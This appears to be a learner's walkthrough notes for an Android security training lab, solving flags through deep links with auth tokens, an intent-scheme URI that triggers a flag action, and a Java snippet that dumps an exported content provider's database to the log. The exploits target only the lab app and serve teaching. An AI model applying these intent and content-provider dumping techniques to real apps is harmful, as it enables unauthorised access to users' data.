![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/0702035f-2fbb-43e2-a2cf-c09e66e48372/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=f554e508ebaf72ad4fa51a2971c77cd795ce848a6c516c67c5cb8bc10c4768c8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
### Flag14
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/a88a1c8d-6cad-4c4d-903a-723e299de9ff/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=536d35850fd7474d9175aea4a51c07754f2a744a420a76f5d860cc8f3f79d6e0&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
From the jadx code we can understand there are query parameters type, authtoken and authcallenge <br>The method to call success we need to set type == admin, authtoken == the base64 strings(because it is what it is being compared) and if we observe closely while loading the webview of flag14 there is an uuid being generated (UUID is Universally Unique Identifier. It is a 128-bit number used to uniquely identify information in computer systems, designed to be globally unique) it is using the same uuid to the same uri which loads flag14 so the uri should be 
hex://token?authToken=598cc075e4379d027f61c02866917c6f1d992c67&type=admin&authChallenge=a2e25516-1502-47bd-8797-5996973fca5a
i used this in flag13 webview and got the flag
### Flag15
This challenge descriptions says that we have to use intent scheme the basic syntax of intent scheme is 
```sql
intent:
   HOST/URI-path // Optional host
   #Intent;
      package=\[string\];
      action=\[string\];
      category=\[string\];
      component=\[string\];
      scheme=\[string\];
   end;
```
In the jadx code we can see the different flags we need to set with uri in order to call the success
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/25f5e264-57f2-4c04-a4ce-3cff56f5e49f/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=1ffef4135d55230ee07c71161fd46c553dee27b63074cff7e6fb13c962e8abeb&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
This says we need to add string as flag and boolean value to true to the uri
It is automatically set to false by default by setting it true we are saying that the extras exist and that is flag and we dont need to add the extra string because its not checking the string value so using tthe boolean value is enough for the challenge
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/f14b5da9-3b62-4f7b-b6e7-4f0d7e95d313/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=d15cffb089ca893d71b73348be9954ded456c6582a9190ec4e82720f3a2a8879&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The above picture indicates the different methods to include extras we can include with the uri
So the final uri will be intent:#Intent;package=io.hextree.attacksurface;action=io.hextree.action.GIVE_FLAG;S.action=flag;B.flag=true;end;
### Flag30
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/ae10ac07-75cd-4047-ada2-4714555d19f1/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=c96b13a715be4747c4b5c8a357f74d5ee903f65967b644ab90211fc22dc34e43&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The above image tells us the basic syntax of a content uri
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/9bd1ee68-c96b-4c51-bb4d-81defe671a49/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=d588e6db937f6f6eb4efcf3510b1f028edc6abf7cda25b632356bd2aa15a1c59&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The above images gives us the the authority we know the schema so the uri looks like
content://io.hextree.flag30/path
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/40acc449-d84a-45f2-8ac6-c03a31df4aee/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=968950cfdbb030551edefc5e7ee033c7373daae1c79dd30b1eb20b66152b55af&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The above image gives us the path so the uri looks like
content://io.hextree.flag30/success and we set all other values to null so that we retrieve all the data from db without any filters
and from the dump uri the code is given by challenge creator itself to dump everything in db using cursor
<br>null (1st) Projection "Which columns do I want?" (Null = Give me everything).<br>null (2nd) Selection "Which rows do I want?" (Filter/Where clause).<br>null (3rd) SelectionArgs The specific values for the filter above.<br>null (4th) SortOrder "How should the list be ordered?" (Alphabetical, Date, etc).
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Cursor cursor = getContentResolver().query(
                Uri.parse("content://io.hextree.flag30/success"),
                null, null,
                null, null
        );
//dump uri
        if (cursor!=null && cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }
```
cursor is a data base tool which let us navigate through out the data base movetofirst etc functions
contentResolver creates an entry point which helps us to get values needed from data base 
For example app A want to retrieve some data from app B so we use contentResolver without letting app A to search all our data base 
### Flag31
Learned that the content provider also has an option id so the the structure of content provider is
***`Structure of a Content URI:  content://authority/optionalPath/optionalID `***
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/5e097392-0892-4a79-83c5-6301225f6730/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=b63f8d8f29ecf976a1c743e4a97e66ae971d4fa3d934bd44321184a9eca27e93&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
Uri matcher is like hashmap but in hashmap we have to match every value since its a uri matcher which is developed by android studio we use it for example the below code is from official documentation
```sql
 private static final int PEOPLE = 1;
    private static final int PEOPLE_ID = 2;
    private static final int PEOPLE_PHONES = 3;
    private static final int PEOPLE_PHONES_ID = 4;
    private static final int PEOPLE_CONTACTMETHODS = 7;
    private static final int PEOPLE_CONTACTMETHODS_ID = 8;

    private static final int DELETED_PEOPLE = 20;

    private static final int PHONES = 9;
    private static final int PHONES_ID = 10;
    private static final int PHONES_FILTER = 14;

    private static final int CONTACTMETHODS = 18;
    private static final int CONTACTMETHODS_ID = 19;

    private static final int CALLS = 11;
    private static final int CALLS_ID = 12;
    private static final int CALLS_FILTER = 15;

    private static final UriMatcher sURIMatcher = new UriMatcher(UriMatcher.NO_MATCH);

    static
    {
        sURIMatcher.addURI("contacts", "people", PEOPLE);
        sURIMatcher.addURI("contacts", "people/#", PEOPLE_ID);
        sURIMatcher.addURI("contacts", "people/#/phones", PEOPLE_PHONES);
        sURIMatcher.addURI("contacts", "people/#/phones/#", PEOPLE_PHONES_ID);
        sURIMatcher.addURI("contacts", "people/#/contact_methods", PEOPLE_CONTACTMETHODS);
        sURIMatcher.addURI("contacts", "people/#/contact_methods/#", PEOPLE_CONTACTMETHODS_ID);
        sURIMatcher.addURI("contacts", "deleted_people", DELETED_PEOPLE);
        sURIMatcher.addURI("contacts", "phones", PHONES);
        sURIMatcher.addURI("contacts", "phones/filter/*", PHONES_FILTER);
        sURIMatcher.addURI("contacts", "phones/#", PHONES_ID);
        sURIMatcher.addURI("contacts", "contact_methods", CONTACTMETHODS);
        sURIMatcher.addURI("contacts", "contact_methods/#", CONTACTMETHODS_ID);
        sURIMatcher.addURI("call_log", "calls", CALLS);
        sURIMatcher.addURI("call_log", "calls/filter/*", CALLS_FILTER);
        sURIMatcher.addURI("call_log", "calls/#", CALLS_ID);
    }
```
we create an id for each path additionally in the same way we created an id for our path in our above code 
It returns 1 for path /flags and 2 for /flag/# where # acts as a placeholder for integers and \* is a place holder for a string of any length with valid characters 
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/9df00fa3-3e54-440a-80da-63f208169e3c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmW